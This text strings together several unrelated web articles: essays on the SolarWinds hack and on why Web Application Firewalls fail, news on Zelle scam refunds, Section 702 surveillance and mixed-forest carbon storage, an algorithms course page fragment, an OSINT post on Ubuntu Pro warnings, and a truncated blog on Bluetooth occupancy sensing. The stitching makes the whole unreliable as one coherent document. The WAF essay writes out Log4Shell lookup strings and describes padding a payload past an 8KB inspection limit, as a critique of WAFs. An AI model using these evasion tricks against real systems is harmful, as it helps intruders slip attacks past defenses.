<p>This idea pre-dates the SolarWinds hack, but it's still around in full force. Many security standards recommend or even require a <a href="https://en.wikipedia.org/wiki/Security_information_and_event_management">Security Information Event Management (SIEM)</a> system. Maybe you'd like to deploy <a href="https://www.solarwinds.com/security-event-manager/siem-tools">SolarWinds' own SIEM product</a>? It should be obvious that installing yet-another highly-privileged agent on all your servers is the exact reason why the SolarWinds hack was as devastating as it was. I appreciate the thought that goes into e.g. <a href="https://www.datadoghq.com/blog/engineering/secure-publication-of-datadog-agent-integrations-with-tuf-and-in-toto/">DataDog's agent build process</a>, but DataDog's agent still runs <a href="https://github.com/DataDog/datadog-agent/blob/fd57de7ae6c889b45f99b57c36896c3c161dfdd2/omnibus/config/templates/datadog-agent/systemd.service.erb">without any kind of systemd sandboxing</a>, which gives it more permissions than it needs. It's one bad world-readable SUID file away from a full takeover, which is just <a href="https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics">one of many local privilege escalation routes</a> that exist on Linux.</p>
<p>Having visibility into your own network is a good idea, but vendors rarely care to follow the principle of least privilege, frequently just demanding full root access (like for <a href="https://static.tenable.com/documentation/nessus_compliance_checks.pdf#page=11">Nessus compliance scans</a> which are entirely read-only). If you need to stop supply chain attacks, more privileged agents will just significantly broaden your exposure to supply chain attacks.</p>
<h2 id="the-inconvenient-truth-about-how-to-actually-fix-this">The Inconvenient Truth about how to actually fix this</h2>
<p>Reading through <a href="https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_508_1.pdf">some of NIST's guidance</a> hints at the real problem in my opinion: "many third-party software products require privileged access". This is an "insecure by design" problem. NIST continues: "Even when a product can effectively operate on a network with reduced privileges, products will oftentimes default to asking for greater privileges during installation to ensure the product’s maximum effectiveness across different types of customer networks. Customers often accept third-party software defaults without investigating further, allowing additional accessibility vectors".</p>
<p>If you want to prevent that from being abused, NIST's recommendations in that document basically amount to "build an enormous, mature security organization". That implicitly assumes everyone keeps the "business as usual" way of installing and running third party software. It doesn't have to be this way.</p>
<h2 id="the-quite-ambitious-solution">The (quite ambitious) solution</h2>
<p><strong>We should run software in a way where we don't really care if it has a vulnerability, because it will happen</strong>. Just like how no good auth system relies on user-memorized passwords alone anymore; we have 2FA and passkeys now which remove that human element as part of their design. That same energy should have been applied in the wake of the SolarWinds hack, but it still feels like "security by design" is a fringe belief.</p>
<p>One idea that could help is <a href="https://en.wikipedia.org/wiki/Capability-based_security">capabilities-based security</a>. The idea is that by default, running software can't do much of anything unless it is given an unforgeable "capability" to do things like access files, the network, particular syscalls, etc. This is fairly incompatible with UNIX and Windows because (aside from root/administrator access), programs have the permission to do a LOT of damage by default, and removing any of those permissions would break a lot programs. If you want security by design, backwards-compatibility is a sacrifice you'll have to make.</p>
<p>Capabilities-based security isn't easy to implement. Some weaknesses I've found in the wild include:</p>
<ul>
<li>Making capabilities too coarse-grained, like having a general "write/edit" permission with no separate "create" or "append" permission, meaning your backup tool is still ripe for a ransomware attack.</li>
<li>Making the default capabilities too permissive, like Docker's default seccomp rules which prioritized compatibility over security.</li>
<li>Making fine-grained capabilities that actually imply other capabilities, like <a href="https://github.com/denoland/deno/issues/2128">Deno's "--allow-run" permission being equal to "--allow-all"</a>. Or Kubernetes' <a href="https://kubernetes.io/docs/concepts/security/secrets-good-practices/#least-privilege-secrets">"create pod" permissions implying "get secret" permissions</a>.</li>
<li>Packaging software alongside the capabilities that constrain it, like RPMs with systemd units that include sandboxing. A supply chain attack could easily remove the sandboxing. You need something like what browser extensions do where new permissions require explicit approval from the user.</li>
<li>Making capabilities apply to too-course of a boundary, like giving one set of capabilities to a complex, multi-threaded process that includes a lot of third-party code for instance. Any sub-component of that process could be tricked into abusing one of its capabilities. <a href="https://github.com/austral/austral">Language-based capabilities</a> have the edge here.</li>
<li>Lacking tools for knowing which capabilities a given program needs. This kills adoption, since not many developers could tell you exactly which kernel features their code uses off the top of their head.</li>
</ul>
<p>If we could agree on a good, standardized capabilities model for software and everyone starts using it, we will have reached security Nirvana.</p>
<ul>
<li>We can keep the benefits of huge dependency trees without the risks!</li>
<li>IT organizations can spend significantly less time on remediating vulns since the vast majority of vulns will not be exploitable!</li>
<li>Lateral movement becomes nearly improbable!</li>
<li>We don't have to hold OSS communities to rigorous security standards that even well-funded companies struggle with!</li>
<li>And more!</li>
</ul>
<h2 id="back-to-reality">Back to reality</h2>
<p>We're still talking about something that's probably a decade away or more, but given the benefits and the constant string of high-profile hacks like the SolarWinds hack, I'm just upset the ball <em>still</em> isn't rolling in the right direction 3 years later.</p>
<p>But history shows it's not impossible, at least not if you're the <a href="https://en.wikipedia.org/wiki/List_of_public_corporations_by_market_capitalization">richest company on the planet</a>. Over time (particularly since <a href="https://www.cultofmac.com/173128/new-ios-6-privacy-settings-limit-access-to-photos-contact-calendars-and-more/">iOS 6</a>), less and less permissions have been granted to iOS apps by default, instead requiring apps to request those permissions from users explicitly. It's still not perfect (like access to contacts still being a binary "yes/no"), but every permission clawed back from the default set required breaking backwards compatibility, a phrase rarely uttered in regard to the Linux and Windows kernels.</p>
<p>If you have been an iOS developer since 2012, I'm sorry you had to go through that, but your extra work has been profoundly important to the privacy and security of mobile OSes. I'd like to see that same <a href="https://www.macchaffee.com/blog/2023/ethics-self-attestation/">principled</a> energy brought to desktop and server OSes. If we don't, the next SolarWinds-like hack is just around the corner.</p>

<p>After <a href="https://arstechnica.com/tech-policy/2022/10/zelle-fraud-is-on-the-rise-and-many-victims-are-denied-refunds/">scammers spent years swiping hundreds of millions from Zelle users</a> by inducing people to authorize fraudulent payments, <a href="https://www.warren.senate.gov/oversight/reports/new-report-by-senator-warren-zelle-facilitating-fraud-based-on-internal-data-from-big-banks">lawmakers were horrified</a> to discover in fall 2022 that "the vast majority" of defrauded Zelle users never got their money back. To regulators, it seemed like Zelle was shirking responsibility for policing this increasingly common fraudulent activity on its payments platform.</p>
<p>But now, Zelle has changed its mind and is working harder to protect users from imposter scams. On Monday, Zelle confirmed that at the end of June, the payments app finally started refunding users targeted by scammers.</p>
<p><a href="https://www.reuters.com/technology/cybersecurity/payments-app-zelle-begins-refunds-imposter-scams-after-washington-pressure-2023-11-13/">According to Reuters</a>, this was possible because Zelle's network operator, Early Warning Services (EWS), found a solution that lets Zelle's network of 2,100 financial firms off the hook for reimbursing transactions where "potentially billions of dollars" might be stolen by imposter scammers. Instead of expecting financial partners to foot the bill to cover this fraudulent activity, Zelle simply "implemented a mechanism that allows banks to claw back funds from the recipient's account and return them to the sender."</p>
<p>"As the operator of Zelle, we continuously review and update our operating rules and technology practices to improve the consumer experience and address the dynamic nature of fraud and scams," an EWS spokesperson told Ars. "As of June 30, 2023, our bank and credit union participants must reimburse consumers for qualifying imposter scams, like when&nbsp;a scammer impersonates a bank to trick a consumer into sending them money with Zelle. The change ensures consistency across our network and goes beyond legal requirements."</p>                                            
                                                        
<p>This is the first time EWS has provided details on its new policy to refund victims of the Zelle imposter scam, Reuters reported. It's a major policy reversal that Reuters said was likely prompted to spare banks and payments apps from stricter regulatory interventions that would require refunds for every scam victim. (Currently, the US only requires banks to refund any fraudulent payments made without customers' authorization.)</p>
<p>The chief fraud risk officer at EWS, Ben Chance, reiterated to Reuters that Zelle's new policy goes "well above existing legal and regulatory requirements."</p>
<p>It's unclear if regulators will be satisfied leaving this matter to banks and payment apps, though. There may be just too many people using payment apps to ignore gaps in laws intended to protect against financial fraud. Between 2018 and 2022, peer-to-peer (P2P) payments quadrupled in the US, the&nbsp;<a href="https://www.consumerfinance.gov/data-research/research-reports/issue-spotlight-analysis-of-deposit-insurance-coverage-on-funds-stored-through-payment-apps/full-report/">Consumer Financial Protection Bureau (CFPB) reported</a>, and by 2027, P2P payments "may reach nearly $1.6 trillion."</p>
<p>Meanwhile, as P2P payments have increased substantially, these imposter scams have become "the most-reported scam," targeting users "across all payment methods," the Federal Trade Commission (FTC) reported. In total, the FTC said that scam victims lost $2.6 billion last year alone.</p>
<p>The CFPB previously mulled new laws that would require lenders to reimburse scam victims, but a person familiar with the matter told Reuters that the CFPB may no longer be considering new protections, because Zelle's recent changes "have so far satisfied the agency." However, Senator Elizabeth Warren (D-Mass.)—who spearheaded the <a href="https://www.warren.senate.gov/oversight/reports/new-report-by-senator-warren-zelle-facilitating-fraud-based-on-internal-data-from-big-banks">probe</a> into Zelle imposter scams—told Reuters that she is not likely to stop monitoring the situation any time soon.</p>
<p>"Zelle's platform changes are long overdue,” Warren said. "The CFPB is standing with consumers, and I urge the agency to keep the pressure on Zelle to protect consumers from bad actors."</p>

        <p>I wanted to write this because I don't hear enough real people discouraging the use of Web Application Firewalls (WAFs). Probably because the search results for "Web Application Firewall" are all written by WAF vendors. Anyone reading just that could conclude that WAFs are a good idea. I'm here to offer another perspective, after having suffered through using a WAF for two years.</p>
<p>Web Application Firewalls were created early in the Internet's history, especially popularized by the <a href="https://en.wikipedia.org/wiki/ModSecurity">ModSecurity project in 2002</a>. WAFs essentially work by intercepting every single HTTP request (and sometimes responses too) and evaluating several hundred regular expressions over the URI, headers, and body, sometimes aided by machine learning. If the request kinda looks like SQL, shell code, etc., the server may block your request.</p>
<p>In the infancy of the cybersecurity field, WAFs seemed like a good idea. HTTP requests were tiny, infrequent, and mostly contained mundane form data. But today, WAFs have overstayed their welcome in the security toolbelt. There are better techniques you can use that make even the most advanced WAFs entirely obsolete.</p>
<h2 id="wafs-have-horrible-performance">WAFs have Horrible Performance</h2>
<p>Since WAFs run hundreds of regular expressions on every request, you may ask, "isn't that super inefficient?" Yes, very.</p>

<p>In addition to slowing down every request, you also need significant additional RAM for buffering requests. Since not a single byte in the buffer can be flushed to the backend server until the WAF completes its analysis, you need several gigabytes of RAM to store request bodies. Servers like nginx buffer requests by default, but enough large concurrent requests (like pushing a container image) can make a buffering web server run out of RAM. When using a WAF, every server becomes a buffering web server, which is simply incompatible with many types of applications.</p>
<p>I know computers are fast and hardware is cheap, but we shouldn't be spending that kind of CPU and RAM on WAFs unless they're a really effective security tool. But they aren't, as you'll see next.</p>
<h2 id="wafs-are-easily-bypassed">WAFs are Easily Bypassed</h2>
<p>WAF vendors and attackers are locked in a constant arms race, but it seems <a href="https://github.com/0xInfection/Awesome-WAF#evasion-techniques">attackers are much better armed</a>. How could they not be? Many of the attacks that a WAF purports to block involve complex grammars like SQL, shell code, and entire programming languages. They often include comments, character escaping, encoding issues, and more oddities. These oddities mean that attackers always have a significant advantage and can typically bypass any WAF rule if they are clever enough.</p>
<p>For example, you might think <a href="https://en.wikipedia.org/wiki/Log4Shell">Log4shell</a> is pretty easy to catch: just check for <code>${jndi</code>, right? Unfortunately, Log4J supports nested "<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">lookups</a>", including ones that convert letters to upper/lower case like <code>${lower:J}</code></p>
<p>That means an attacker can insert an arbitrary number of nested lookups around each letter and still perform the attack, like this: <code>${${lower:J}ndi:...</code>. This lead CloudFlare to say <a href="https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns/">"WAF vendors need to be looking at any occurrence of <code>${</code> and treating it as suspicious"</a>, which is just another hilarious example of how WAFs can never live up to the expectations placed on them.</p>
<p>I just discussed the fairly simple grammar that is Log4J Lookups, but you can imagine how many more evasion tactics you could use in a language as complex as SQL or PHP, especially when considering encoding tricks. For an in-depth description of specific WAF bypass techniques, check out <a href="https://habr.com/en/companies/dsec/articles/454592/">this awesome post</a>.</p>
<p>Another way to bypass a WAF involves just padding your attack string to appear <a href="https://docs.aws.amazon.com/waf/latest/developerguide/waf-oversize-request-components.html">&gt;8KB or so</a> into the request body. Like I mentioned in the section on performance, request bodies must be buffered into RAM for analysis, so WAFs must choose some cut-off point to avoid spending infinite CPU and RAM on a single request. For some WAFs like AWS's, that cutoff point is around 8KB. So if you just put 8192 innocuous characters before your Log4Shell attack string, you've rendered the WAF worthless.</p>
<h2 id="wafs-are-an-attack-vector">WAFs are an Attack Vector</h2>
<p>In 2019, CapitalOne experienced a breach of 100 million credit applications that was <a href="https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/">allegedly caused by a WAF misconfiguration</a>. The attacker allegedly tricked the WAF into sending requests to the EC2 Metadata Service, which handed out a credential that allowed reading sensitive files from S3.</p>
<p>While this is just one example, it illustrates the curious fact that WAFs actually have a large attack surface.</p>
<p>Most WAFs are giant, complex codebases that are usually closed-source and written in memory-unsafe languages. Since they're expensive "enterprise" products, companies stuff them full of unnecessary features to make them stand out more than competitors. All of this adds up to make WAFs yet another example of a dangerous "security" tool, <a href="https://www.macchaffee.com/blog/2023/solarwinds-hack-lessons-learned/">just like SolarWinds</a>.</p>
<p>No security officer would approve taking such a risky piece of software, putting it directly on the internet, making it parse mountains of untrusted input, and giving it access to all your backend servers, logging infra, SIEM, alerting systems, <a href="https://docs.fastly.com/en/ngwaf/jira">and even JIRA for some reason</a> UNLESS it's covered in security buzzwords and costs 5-6 figures per year.</p>
<p>Somehow, companies that sell security products have gotten a pass on implementing foundational security principles like secure by default, secure by design, attack surface reduction, and the principle of least privilege. Don't let them keep getting away with that.</p>
<h2 id="wafs-have-a-high-false-positive-rate">WAFs have a High False Positive Rate</h2>
<p>Over the last twenty years, open-source WAF rulesets have expanded considerably to detect more-recent types of attack. Apparently all those proprietary WAFs are doing the same. That means there are more and more possible strings that could trigger a WAF to block your request. If you want to write a comment on an article discussing Log4shell, you might be blocked for including the string <code>${jndi</code> in your comment. So naturally the false positive rate continues to rise with every new rule, and it's already quite high based on my experience maintaining a giant list of ModSecurity rule exceptions.</p>
<p>So-called "next-generation" WAFs claim to solve this problem by <a href="https://docs.fastly.com/en/ngwaf/about-next-gen-waf">looking at multiple requests</a> or by using <a href="https://docs.fastly.com/en/ngwaf/about-the-architecture#about-the-collection-and-analysis-system">IP reputation systems</a>. While these can improve false positive rates, they can never truly solve the problem. In some ways, less false positives can increase the impact of particular false positives since neither users nor support teams have a clear procedure for fixing it. CloudFlare's algorithm can randomly decide to block you and <a href="https://www.ctrl.blog/entry/cloudflare-ip-blockade.html">you will have no recourse</a>. Imagine that happening to someone less tech-savvy.</p>
<p>This is the classic problem with using an outdated security tool like a WAF: defenders have to configure the tool absolutely perfectly to be safe and avoid false positives, but attackers just need to find a single weakness. Those are horrible odds. You should use alternatives that don't require perfection from imperfect humans.</p>
<h2 id="alternatives-to-wafs">Alternatives to WAFs</h2>
<p>Since WAFs are resource-hungry, inneffective, unsafe, and noisy, how do I convince an auditor to not make me use one? The technical term would be to use "compensating controls", but that sounds like such a weak term to describe the powerful and simple alternatives to WAFs I'm about to describe:</p>
<ul>
<li><strong>Isolation:</strong> Isolation involves ensuring that a breach in one component can not affect the rest of the system, and there are many technologies that provide isolation.
<ul>
<li>Browsers do this by executing all code inside special sandboxed processes that don't have carte blanch access to cookies, saved passwords, other tabs, etc. Imagine how slow the web would be if every piece of JavaScript needed to be analyzed by hundreds of regexes before being executed!</li>
<li>Microservices are designed with isolation in mind, but you can also do it in a monolith with a variety of <a href="https://github.com/dckc/awesome-ocap#libraries-and-frameworks">libraries and languages</a>.</li>
</ul>
</li>
<li><strong>Immutability:</strong> Entire classes of attack can be eliminated by removing a few assumptions, like having a <a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/">readOnlyRootFilesystem</a>, a <a href="https://thenewstack.io/3-immutable-operating-systems-bottlerocket-flatcar-and-talos-linux/">package manager that requires rebooting</a>, or append-only/<a href="https://www.rsync.net/resources/faq.html#9a">immutable backups</a>.</li>
<li><strong>Static Analysis:</strong> SQL injection has a miracle cure called "prepared statements". The problem is that devs forget to use them. Static analysis checks in a CI pipeline can all but ensure that zero SQL injection vulnerabilities are in your codebase, at which point there is no need for any SQL injection WAF rules. No, "defense in depth" is not a valid excuse to use a WAF anyway, because it provides no real defense! Like surrounding Fort Knox with an army of guard guinea pigs.</li>
<li><strong>Capability-based security:</strong> Not every API endpoint needs to have unrestricted read/write access to your entire database and file system, but that is the normal way people build APIs today. By using capabilities, you can express exactly that "GET /api/v1/books" only needs read access to the "books" table. Or that "POST /api/v1/imageupload" needs write access to a specific folder, but doesn't need the ability to spawn processes.</li>
</ul>
<p>Now I'll admit these ideas are quite broad; you'll need to adapt them to your particular app. WAF vendors offer a one-WAF-fits-all fantasy that I can't match. But these secure-by-design strategies are the way that the security industry needs to be heading. Unfortunately, it's a lot harder for the security industry to profit off of design-based techniques, so don't hold your breath.</p>

<div id="readability-page-1" class="page"><div>
            <article role="article">
  
  
  <div><p><span>Section 702 is the controversial and much-abused mass surveillance authority that expires in December unless Congress renews it. EFF and others have been working hard to get real reforms into the law and have opposed a renewal, and now, we’re hearing about a rushed attempt to tie renewal to funding the government. We need to stop it.</span></p>
<p><span>In September, President Biden signed a short-term continuing resolution to fund the government preventing a full shutdown. This week Congress must pass another bill to make sure it doesn’t happen again. But this time, we understand that Congress wants to </span><a href="https://rollcall.com/2023/11/11/senate-stopgap-plan-might-extend-to-january-jettison-war-funds/"><span>vote on a "clean" renewal of Section 702</span></a>—essentially, kicking the can down the road, as they've done before<span>. <br></span></p>
<p><span>The program was intended to collect communications of people outside of the United States, but because we live in an increasingly globalized world, the government retains a massive trove of communications between Americans and people overseas. Increasingly, it’s this U.S. side of digital conversations that domestic law enforcement agencies trawl through—all without a warrant.</span></p>
<p><span>This is not how the government should work. Lawmakers should not take an unpopular, contested, and dangerous piece of legislation and slip it into a massive bill that, if opposed, would shut down the entire government. No one should have to choose between funding the government and renewing a dangerous mass surveillance program that even&nbsp;</span><a href="https://www.eff.org/deeplinks/2023/09/federal-governments-privacy-watchdog-concedes-702-must-change"><span>the federal government admits is in need of reform</span></a><span>.&nbsp; <br></span></p>
<p><span>EFF has signed onto a </span><a href="https://www.brennancenter.org/our-work/research-reports/coalition-statement-urges-senator-schumer-keep-reauthorization-section"><span>letter</span></a><span> with a dozen organizations opposing even a short-term reauthorization of a program as dangerous as 702 in a piece of vital legislation. The letter says: <br></span></p>
<blockquote><p><span>“In its current form, this authority is dangerous to our liberties and our democracy, and it should not be renewed for any length of time without robust debate, an opportunity for amendment, and — ultimately — far-reaching reforms. </span><b>Allowing a short-term reauthorization to be slipped into a must-pass bill would demonstrate a blatant disregard for the civil liberties and civil rights of the American people.</b><span>”</span></p>
</blockquote>
<p><span>For months, EFF and a large coalition of </span><a href="https://www.wired.com/story/government-surveillance-reform-act-2023/"><span>civil rights, civil liberties, and racial justice groups</span></a><span> have been fighting the renewal of Section 702. Just last week, a group of privacy-minded Senators and Representatives introduced the </span><a href="https://www.eff.org/deeplinks/2023/11/government-surveillance-reform-act-would-rein-some-worst-abuses-section-702"><span>Government Surveillance Reform Act</span></a><span>, which would introduce some much-needed safeguards and oversight onto a historically out-of-control surveillance program. Section 702 is far too powerful, invasive, and dangerous to renew it cleanly as a matter of bureaucratic necessity and we say that it has to be renewed with massive reforms or not at all. Sneaking something this important into a massive must-pass bill is dishonest and a slap in the face to all people who care about privacy and the integrity of our digital communications.&nbsp;</span></p>

and
<a href="https://courses.engr.illinois.edu/cs473/">CS&nbsp;473</a>.  I taught these courses most recently in <a href="https://courses.engr.illinois.edu/cs374/sp2018/A/schedule.html">Spring 2018</a>
and <a href="https://courses.engr.illinois.edu/cs473/sp2017/lectures.html">Spring 2017</a>, respectively.  
I maintain a complete archive of <a href="http://jeffe.cs.illinois.edu/teaching/algorithms/hwex.html">my past homeworks, exams, and lab handouts</a> on a separate page.

</p><p>
<b>Prerequisites.</b>  The textbook assumes knowledge of discrete math (especially induction) and basic data structures and algorithms (especially recursion) consistent with the prerequisite courses <a href="https://courses.engr.illinois.edu/cs173/">CS 173</a> and <a href="https://courses.engr.illinois.edu/cs225/sp2019/">CS 225</a> at Illinois.

<h3><a name="notes"> More Algorithms Lecture Notes </a></h3>

Both the topical coverage (except for flows) and the level of difficulty of the textbook material  (mostly) reflect the algorithmic content of CS 374.  The remainder of these notes cover either more advanced aspects of topics from the book, or other topics that appear only in our more advanced algorithms class CS 473.  Don't be fooled by the fancy typesetting; these notes are <em>considerably</em> less polished than the textbook.

<ul> 
<li>
<b>Extended Dance Remix:</b> These are notes on more advanced material directly related to the textbook.  The notes are ordered roughly to match the textbook chapters.

<section>
<p>Posted by Aaron Kelley</p>
<p>Several readers of our <a href="https://inteltechniques.com/book1.html">OSINT Techniques book</a> and <a href="https://www.inteltechniques.net/">Online Video Training</a> have expressed concern about Ubuntu's new Pro feature and update restrictions for those who do not subscribe to the service. Since we recommend Ubuntu for OSINT virtual machines, we should address the issue and offer some guidance. Let's start with addressing Ubuntu Pro. If you run 'sudo apt update' and 'sudo apt upgrade' within an Ubuntu Terminal, you will likely see something similar to the following.</p>
<p><img fetchpriority="high" decoding="async" src="https://inteltechniques.com/blog/wp-content/uploads/Image-5-620x261.png" alt="" width="620" height="261" srcset="https://inteltechniques.com/blog/wp-content/uploads/Image-5-620x261.png 620w, https://inteltechniques.com/blog/wp-content/uploads/Image-5-300x126.png 300w, https://inteltechniques.com/blog/wp-content/uploads/Image-5-768x323.png 768w, https://inteltechniques.com/blog/wp-content/uploads/Image-5.png 1288w" sizes="(max-width: 620px) 100vw, 620px"></p>
<p>This warning appears concerning as it insinuates that some updates are being withheld from your machine unless you subscribe to the Pro service. The following warning from Ubuntu's software updater is even more alarming.</p>
<p><img decoding="async" src="https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-620x344.png" alt="" width="620" height="344" srcset="https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-620x344.png 620w, https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-300x166.png 300w, https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-768x426.png 768w, https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-1536x851.png 1536w, https://inteltechniques.com/blog/wp-content/uploads/Image-2-1-2048x1135.png 2048w" sizes="(max-width: 620px) 100vw, 620px"></p>
<p>This appears to present a lot of outdated software which we cannot update. However, looks can be deceiving. Click on any of these updates and look at the details pane. As one example, I clicked on Ffmpeg and observed the following.</p>
<p><img decoding="async" src="https://inteltechniques.com/blog/wp-content/uploads/Image-3-1-620x217.png" alt="" width="620" height="217" srcset="https://inteltechniques.com/blog/wp-content/uploads/Image-3-1-620x217.png 620w, https://inteltechniques.com/blog/wp-content/uploads/Image-3-1-300x105.png 300w, https://inteltechniques.com/blog/wp-content/uploads/Image-3-1-768x269.png 768w, https://inteltechniques.com/blog/wp-content/uploads/Image-3-1.png 1154w" sizes="(max-width: 620px) 100vw, 620px"></p>
<p>The "Available version" is the exact same product as the currently installed software. The update does nothing. Running 'pro security-status' displays the following.</p>
<p><img loading="lazy" decoding="async" src="https://inteltechniques.com/blog/wp-content/uploads/Image-4-1-620x191.png" alt="" width="620" height="191" srcset="https://inteltechniques.com/blog/wp-content/uploads/Image-4-1-620x191.png 620w, https://inteltechniques.com/blog/wp-content/uploads/Image-4-1-300x93.png 300w, https://inteltechniques.com/blog/wp-content/uploads/Image-4-1-768x237.png 768w, https://inteltechniques.com/blog/wp-content/uploads/Image-4-1.png 1446w" sizes="(max-width: 620px) 100vw, 620px"></p>
<p>This confirms that our machine is receiving all Main/Restricted updates until 2027, at which time we would be using Ubuntu 26.04. We do not need extended updates until 2032 as offered through Ubuntu Pro. This makes Ubuntu Pro unnecessary for our needs. Opting to avoid Ubuntu Pro does not restrict your machine from the typical security updates which Ubuntu has always provided. The options available within Ubuntu Pro are enhancements to Ubuntu and no features have been removed from a typical Ubuntu installation. The focus of Ubuntu Pro is to extend the availability of updates from five to ten years, and provide some third-party security patches which may not be available otherwise. We should not be using old versions of Ubuntu for our VMs, so this does little for us within an investigative VM.</p>
<p>Ubuntu Pro is available for free for personal use, but it requires you to attach a unique license key to your Ubuntu installation, which will be tracked by Canonical. We do not recommend this. Instead, we encourage users to remove these unnecessary warnings with the following command.</p>
<p>mv /etc/apt/apt.conf.d/20apt-esm-hook.conf /etc/apt/apt.conf.d/20apt-esm-hook.conf.bak</p>
<p>After this command, which only renames the file responsible for this warning, updating through Terminal (and therefore the update script we provide within the VM), should appear as follows.</p>
<p><img loading="lazy" decoding="async" src="https://inteltechniques.com/blog/wp-content/uploads/Image-5-1-620x120.png" alt="" width="620" height="120" srcset="https://inteltechniques.com/blog/wp-content/uploads/Image-5-1-620x120.png 620w, https://inteltechniques.com/blog/wp-content/uploads/Image-5-1-300x58.png 300w, https://inteltechniques.com/blog/wp-content/uploads/Image-5-1-768x148.png 768w, https://inteltechniques.com/blog/wp-content/uploads/Image-5-1.png 1130w" sizes="(max-width: 620px) 100vw, 620px"></p>
<p>We feel that Ubuntu is being aggressively misleading with the rollout of Ubuntu Pro, and we do not recommend any OSINT users attach this service to their investigative VMs. We have not recommended Ubuntu as a host OS for some time.</p>

<p>To slow the effects of climate change, conserve biodiversity, and meet the sustainable development goals, replanting trees is vital. Restored forests store carbon within the forest's soil, shrubs, and trees. Mixed forests are especially effective at carbon storage, as different species with complementary traits can increase overall carbon storage.

										  
											        </p>
										 
										 											  
<p>Compared to single-species forests, mixed forests are also more resilient to pests, diseases, and climatic disturbances, which increases their long-term <a href="https://phys.org/tags/carbon+storage/" rel="tag">carbon storage</a> potential. The delivery of other ecosystem services is also greater in mixed species forests, and they support higher levels of biodiversity.
</p><p>Although the benefits of diverse forest systems are well known, many countries' restoration commitments are focused on establishing monoculture plantations. Given this practice, an international team of scientists has compared <a href="https://phys.org/tags/carbon+stocks/" rel="tag">carbon stocks</a> in mixed planted forests to <a href="https://phys.org/tags/carbon/" rel="tag">carbon</a> stocks in commercial and best-performing monocultures, as well as the average of monocultures.
</p><p>Their work is published in <i>Frontiers in Forests and Global Change</i>.
</p><p>"Diverse planted forests store more carbon than monocultures—upwards of 70%," said Dr. Emily Warner, a postdoctoral researcher in ecology and biodiversity science at the Department of Biology, University of Oxford, and first author of the study. "We also found the greatest increase in carbon storage relative to monocultures in four-species mixtures."
</p><h2>Species richness increases carbon storage potential</h2>
<p>The researchers analyzed studies published since 1975 that directly compared carbon storage in mixed and single-species forests, and combined this with previously unpublished data from a global network of tree diversity experiments. "We wanted to pull together and assess the existing evidence to determine whether forest diversification provides carbon storage benefits," Warner explained.
</p><p>The mixed planted forests assessed in the study ranged in <a href="https://phys.org/tags/species+richness/" rel="tag">species richness</a> from two to six species. In the data set the scientists worked with, four-species mixtures were the most effective carbon sinks. One such mix was made up from different broadleaf trees, which can be found across Europe. Mixes with two species also had greater above-ground carbon stocks than monocultures and stored up to 35% more carbon. Forests made up of six species, however, showed no clear advantage to monocultures.
</p><p>Accordingly, the researchers were able to show that diversification of forests enhances carbon storage. Altogether, above-ground carbon stocks in mixed forests were 70% higher than in the average monoculture. The researchers also found that mixed forests had 77% higher carbon stocks than commercial monocultures, made up of species bred to be particularly high yielding.
</p><h2>Forests for the future</h2>
<p>"As momentum for <a href="https://phys.org/tags/tree+planting/" rel="tag">tree planting</a> grows, our study highlights that mixed species plantations would increase carbon storage alongside other benefits of diversifying planted forests," said Dr. Susan Cook-Patton, a senior forest restoration scientist at The Nature Conservancy and collaborator on the study. The results are particularly relevant to forest managers, showing that there is a productivity incentive for diversifying new planted forests, the researchers pointed out.
</p><p>While showing the increased potential of mixed forests to store more carbon, the researchers cautioned that their study is not without limitations, including the overall limited availability of studies addressing mixed vs. monoculture forests, particularly studies from older forests and with higher levels of tree diversity.
</p><p>"This study demonstrates the potential of diversification of planted forests, and also the need for long-term <a href="https://phys.org/tags/experimental+data/" rel="tag">experimental data</a> to explore the mechanisms behind our results," Warner said. "There is an urgent need to explore further how the carbon <a href="https://phys.org/tags/storage/" rel="tag">storage</a> benefits of diversification change depending on factors such as location, <a href="https://phys.org/tags/species/" rel="tag">species</a> used and <a href="https://phys.org/tags/forest/" rel="tag">forest</a> age."

        <section>
            <p>Have you ever wanted to design a full end-to-end software solution to collect occupancy data across a college campus?</p>
<p>I didn't think I would either, but here we are.</p>
<h2 id="the-inspiration">The inspiration</h2>
<p>During my first year in college, we had Sodexo as our dining provider. They had a contract with <a href="https://www.bluefox.io/products/count">Bluefox</a>, who provides occupancy sensors to report the number of people within a dining hall. I'd like to think they used this data to improve dining hall operations. I couldn't tell you what they <em>actually</em> used it for. I can say that after some FOIA requests a friend made that returned PDF's with awful kerning, these devices work by counting smartphone MAC addresses from Bluetooth advertising packets. This was a pretty cool way for me to avoid crowds in the dining hall - toss the API call into Grafana, and you have a live chart of how busy the dining halls are.</p>
<h2 id="the-downfall">The downfall</h2>
<p>Unfortunately, the university switched dining hall providers to Aramark. Aramark does not contract Bluefox to provide the same occupancy counts, which meant no more occupancy data, which meant no more skipping busy hours.</p>
<h2 id="the-climb-back">The climb back</h2>
<p>The idea of tracking occupancy metrics with a bluetooth beacon was stuck in my head. What design decisions and considerations would you need to make?</p>
<ul>
<li>How accurate is BLE beacon count, as a proxy for occupancy?
<ul>
<li>Some people carry around headphones, smartwatches, etc - but some don't carry any devices at all (or keep Bluetooth off on their phone).</li>
</ul>
</li>
<li>How accurate is BLE beacon availability time, as a proxy for dwell time?
<ul>
<li>Can we use unique MAC addresses' churn to detect this?</li>
<li>Is the built-in MAC address randomization that is common across <a href="https://source.android.com/docs/core/connect/wifi-mac-randomization-behavior">many</a> different <a href="https://support.apple.com/guide/security/bluetooth-security-sec82597d97e/web#sec18ee64d9d">manufacturers</a> going to impact this? (Even though this privacy feature has <a href="https://ieeexplore.ieee.org/document/9369628">flaws</a>)</li>
</ul>
</li>
<li>How can we communicate the results back to a central server?
<ul>
<li>WiFi seems the obvious choice for me. Not every location will have easy-to-access WiFi, though.</li>
